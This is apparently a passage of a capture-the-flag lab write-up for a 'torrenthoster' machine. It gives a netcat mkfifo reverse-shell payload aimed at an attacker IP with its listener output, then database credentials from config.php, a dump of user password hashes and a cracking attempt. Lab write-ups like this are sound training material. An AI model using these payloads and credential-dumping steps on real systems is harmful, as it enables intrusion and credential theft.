## Reverse shell
- Use the RCE to spawn a reverse shell
```bash
#payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9001 >/tmp/f
```

```bash
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.6] 39852
/bin/sh: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## DB 
- Look in the database directory (/var/www/torrent/database) to find a sql file that is readable. This file contains a hash for the admin user password.
- Look in config.php to find DB creds
```php
  $CFG->host = "localhost";    
  $CFG->dbName = "torrenthoster";       //db name                                                                                                                                                                                                                                                                            
  $CFG->dbUserName = "torrent";    //db username
  $CFG->dbPassword = "SuperSecret!!";   //db password
```
- Use these to dump creds in db:
```sql
mysql> select username,password from users;
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| Admin    | d5bfedcee289e5e05b86daad8ee3e2e2 | 
| user     | 5f4dcc3b5aa765d61d8327deb882cf99 | 
+----------+----------------------------------+
```
- Tried cracking admin hash but didn't work with rockyou

## User flag
- The www-data user has read access to the flag in george's home directory. Not sure if this is intended?
